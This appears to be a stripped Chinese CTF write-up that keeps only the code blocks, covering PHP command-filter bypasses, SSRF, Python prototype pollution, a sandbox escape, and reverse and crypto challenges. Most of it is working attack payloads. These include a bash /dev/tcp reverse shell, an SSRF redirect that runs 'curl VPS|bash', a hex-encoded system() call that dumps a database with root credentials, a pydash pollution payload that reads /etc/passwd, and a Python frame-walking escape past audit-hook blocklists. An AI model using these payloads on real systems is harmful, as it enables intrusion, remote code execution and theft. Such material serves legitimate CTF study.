# a = [0xDB, 0xE2, 0x1D, 0xB9, 0xCE, 0xCF, 0x34, 0x65, 0xBF, 0x41, 0xD8, 0xCB, 0x3F, 0xD2, 0xDB, 0xAB, 0x6B, 0xA8, 0x7D, 0x86, 0xD6, 0xD5, 0x0F, 0xDD, 0x4A, 0x67, 0x38, 0x96, 0xA9, 0xC2, 0xB1, 0x24, 0xD2, 0xE8, 0xFE, 0x99, 0xE7, 0x5E]
# input = [0x05, 0x48, 0x5F, 0x45, 0xC7, 0xC7, 0x86, 0x63, 0xB2, 0xD2, 0xB9, 0x3F, 0x1B, 0x9B, 0xCE, 0xAA, 0xBC, 0x03, 0x79, 0x9E, 0x19, 0x3C, 0xDA, 0x4B, 0x79, 0xAD, 0xC1, 0xBC, 0xF7, 0x28, 0x9C, 0x18, 0x46, 0x87, 0xC6, 0x04, 0xBF, 0xB4]
# rand3 = []
# for i in range(38):
#     rand3.append(a[i] ^ input[i])
# print(rand3)
rand3 = [222, 170, 66, 252, 9, 8, 178, 6, 13, 147, 97, 244, 36, 73, 21, 1, 215, 171, 4, 24, 207, 233, 213, 150, 51, 202, 249, 42, 94, 234, 45, 60, 148, 111, 56, 157, 88, 234]

v31 = []
for i in range(38):
    v31.append(ord(enc[i]) ^ list_55C3994010A0[i])
print(v31)

v12 = []
for i in range(38):
    v12.append(v31[i] ^ rand3[i])
print(v12)

v28 = [0] * 38
for i in range(38):
    v28[ptr[i]] = v12[i]
print(v28)

for i in range(38):
    print(chr(v28[i] ^ rand1[i]), end="")
```



```
<?php
ini_set('open_basedir', '/var/www/html/');
error_reporting(0);

if(isset($_POST['cmd'])){
    $cmd = escapeshellcmd($_POST['cmd']); 
     if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|?|wget|'|"|id|whoami/i', $cmd)) {
         system($cmd);
  }
}

show_source(__FILE__);
?>
```



```
l%0as
d%0air
```



```
cmd=php -r system(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773656c656374202a2066726f6d205048505f434d532e463161675f5365335265373b27603b,1)));

//解码为：
echo `mysql -u root -p'root' -e 'select * from PHP_CMS.F1ag_Se3Re7;'`;
```



```
代码审计
```



```
//简单的cms，可以扫扫看？
//提示1： /flag.php： 

if($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){
   echo "Just input 'cmd' From 127.0.0.1";
   return;
}else{
   system($_GET['cmd']);
}

//提示2：github找一下源码?
//需要做一个请求访问本地127.0.0.1
```



```
index.php?s=api&c=api&m=qrcode&text=1&thumb=http://VPS:2234/index1.php&size=10&level=1
```



```
bash -i >& /dev/tcp/IP/3457 0>&1
```



```
from sanic import Sanic
from sanic.response import text, html
from sanic_session import Session
import pydash
# pydash==5.1.2

class Pollute:
    def __init__(self):
        pass

app = Sanic(__name__)
app.static("/static/", "./static/")
Session(app)

@app.route('/', methods=['GET', 'POST'])
async def index(request):
    return html(open('static/index.html').read())

@app.route("/login")
async def login(request):
    user = request.cookies.get("user")
    if user.lower() == 'adm;n':
        request.ctx.session['admin'] = True
        return text("login success")

    return text("login fail")

@app.route("/src")
async def src(request):
    return text(open(__file__).read())

@app.route("/admin", methods=['GET', 'POST'])
async def admin(request):
    if request.ctx.session.get('admin') == True:
        key = request.json['key']
        value = request.json['value']
        if key and value and type(key) is str and '_.' not in key:
            pollute = Pollute()
            pydash.set_(pollute, key, value)
            return text("success")
        else:
            return text("forbidden")

    return text("forbidden")

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```



```
Cookie: user="adm 73n"  //ASCII字符绕过
```



```
{"key":"__init__\\.__globals__\\.__file__","value":"/etc/passwd"}
```



```
/home/ctf/.bash_history
/root/flag
/flag
/proc/1/environ
/proc/fd/self/cmdline
```



```
<?php
echo "GIF89a"
$url = "http://127.0.0.1/flag.php?cmd=curl http://VPS:2333/1.txt|bash";

header('Location: ' . $url, true, 302);
echo "GIF89a";
echo "GIF89a";
exit();
?>
```



```
from sys import exit
from builtins import print
from dis import dis
from builtins import str
from io import StringIO
from sys import addaudithook
from contextlib import redirect_stdout
from random import randint, randrange, seed
from time import time
import os

def source_simple_check(source):
    """
    检查源码中是否包含危险字符串，使用纯字符串查找
    :param source: 源码
    :return: None
    """
    
    try:
        source.encode("ascii")
    except UnicodeEncodeError:
        print("不允许使用非 ASCII 字符")
        exit()

    for i in ["__", "getattr", "exit"]:
        if i in source.lower():
            print(i)
            exit()

def block_wrapper():
    """
    使用 sys.audithook 检查运行进程，禁止进行危险操作
    :return: None
    """
    
    def audit(event, args):
        for i in ["marshal", "__new__", "process", "os", "sys", "interpreter", "cpython", "open", "compile", "gc"]:
            if i in (event + "".join(str(s) for s in args)).lower():
                print(i)
                os._exit(1) # 会直接将python程序终止，之后的所有代码都不会继续执行。
    return audit

def source_opcode_checker(code):
    """
    检查源码的字节码方面，禁止加载方法和全局变量
    :param code: 源码
    :return: None
    """

    opcodeIO = StringIO()
    dis(code, file=opcodeIO)
    opcode = opcodeIO.getvalue().split("n")
    opcodeIO.close()
    for line in opcode:
        if any(x in str(line) for x in ["LOAD_GLOBAL", "IMPORT_NAME", "LOAD_METHOD"]):
            if any(x in str(line) for x in ["randint", "randrange", "print", "seed"]):
                break
            print("".join([x for x in ["LOAD_GLOBAL", "IMPORT_NAME", "LOAD_METHOD"] if x in str(line)]))
            exit()

if __name__ == "__main__":
    source = open(f"/app/uploads/THIS_IS_TASK_RANDOM_ID.txt", "r").read()
    source_simple_check(source) # 函数用于设置审计钩子，监控运行进程，当事件或参数中包含特定危险关键词（如 "marshal", "new", "process", "os"等）时
    source_opcode_checker(source) # 函数用于检查源码的字节码，禁止加载特定的方法和全局变量，以防止执行恶意代码
    code = compile(source, "<sandbox>", "exec")
    addaudithook(block_wrapper()) 
    outputIO = StringIO()
    with redirect_stdout(outputIO):
        seed(str(time()) + "THIS_IS_SEED" + str(time()))
        exec(code, {
            "__builtins__": None,
            "randint": randint,
            "randrange": randrange,
            "seed": seed,
            "print": print
        }, None)
    output = outputIO.getvalue()

    if "THIS_IS_SEED" in output:
        print("这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！")
        print("bad code-operation why still happened ah?")
    else:
        print(output)
```



```
import os
import subprocess
from flask import Flask, request, jsonify
from uuid import uuid1

app = Flask(__name__)

runner = open("/app/runner.py", "r", encoding="UTF-8").read()
flag = open("/flag", "r", encoding="UTF-8").readline().strip()

@app.post("/run")
def run():
    id = str(uuid1())
    try:
        # 生成一个基于时间的唯一 ID。
# 获取 POST 请求中的 JSON 数据，从中获取键为 "code" 的值作为用户提交的 Python 代码。
# 将用户提交的代码写入到以 ID 命名的 .py 文件中，同时替换其中的特殊字符串为之前读取的 flag 和 ID。
        data = request.json
        open(f"/app/uploads/{id}.py", "w", encoding="UTF-8").write(
            runner.replace("THIS_IS_SEED", flag).replace("THIS_IS_TASK_RANDOM_ID", id))
        open(f"/app/uploads/{id}.txt", "w", encoding="UTF-8").write(data.get("code", ""))
        run = subprocess.run( 
            ['python', f"/app/uploads/{id}.py"],
            # 使用 subprocess.run 执行用户提交的代码，限定执行时间为 3 秒，并捕获标准输出和错误输出。将执行结果和错误信息转换为字符串
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=3
        )
        result = run.stdout.decode("utf-8")
        error = run.stderr.decode("utf-8")
        print(result, error)
        if os.path.exists(f"/app/uploads/{id}.py"):
            os.remove(f"/app/uploads/{id}.py")
        if os.path.exists(f"/app/uploads/{id}.txt"):
            os.remove(f"/app/uploads/{id}.txt")
        return jsonify({
            "result": f"{result}n{error}"
        })
    except:
        if os.path.exists(f"/app/uploads/{id}.py"):
            os.remove(f"/app/uploads/{id}.py")
        if os.path.exists(f"/app/uploads/{id}.txt"):
            os.remove(f"/app/uploads/{id}.txt")
        return jsonify({
            "result": "None"
        })

if __name__ == "__main__":
    app.run("0.0.0.0", 5000)
```



```
def getflag():
    def f():
        yield g.gi_frame.f_back

    g = f()
    frame=[x for x in g][0]
    gattr = frame.f_back.f_back.f_back.f_locals['_'+'_builtins_'+'_']  

    code = frame.f_back.f_back.f_back.f_code 

    gattr_dir = gattr.dir
    s  = gattr.str
    print(gattr_dir(code))

    for i in s(code.co_consts):
        print(i,end=",")

getflag()

## f_back（返回前一帧） 提取获取globals全局符号表,利用栈帧进行逃逸出沙箱
# ['_'+'_builtins_'+'_']  绕过过滤判断

# 读取到的code值为:
# ['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_kwonlyargcount', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_posonlyargcount', 'co_stacksize', 'co_varnames', 'replace']
# 代码不允许Ascci字符
```



```
import numpy as np
import matplotlib.pyplot as plt
import os

#加载NPZ文件
npzfile = np.load('./attachment.npz')
# 获取数组数据
index_array = npzfile['index']
input_array = npzfile['input']
trace_array = npzfile['trace']
# 创建存储图形的文件夹
os.makedirs('image', exist_ok=True)
# 绘制图形并保存
for i in range(len(trace_array)):
    plt.figure(figsize=(8, 6))
    plt.plot(np.arange(len(trace_array[i])) + 1, trace_array[i])
    plt.xlabel('Index')
    plt.ylabel('trace')
    plt.title(f'{i + 1}')
    plt.text(0.5, 0.5, 'Index: {}, Input: {}'.format(index_array[i], input_array[i]), fontsize=10, transform=plt.gca().transAxes)
    plt.grid(True)
    plt.savefig(f'./image/{i + 1}.png')
    plt.close()
```



```
from Crypto.Util.number import *
from secret import flag

nbits = 512
p = getPrime(nbits)
q = getPrime(nbits)
n = p * q
phi = (p-1) * (q-1)
while True:
    kk = getPrime(128)
    rr = kk + 2
    e = 65537 + kk * p + rr * ((p+1) * (q+1)) + 1
    if gcd(e, phi) == 1:
        break
m = bytes_to_long(flag)
c = pow(m, e, n)

e = e >> 200 << 200
print(f'n = {n}')
print(f'e = {e}')
print(f'c = {c}')

"""
n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967
e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104
c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823
"""
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/10-1716187884.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/0-1716187885.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1716187886.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/1-1716187887.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/1-1716187887.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1716187888.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/0-1716187888.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/10-1716187889.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/6-1716187889.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/5-1716187889.png)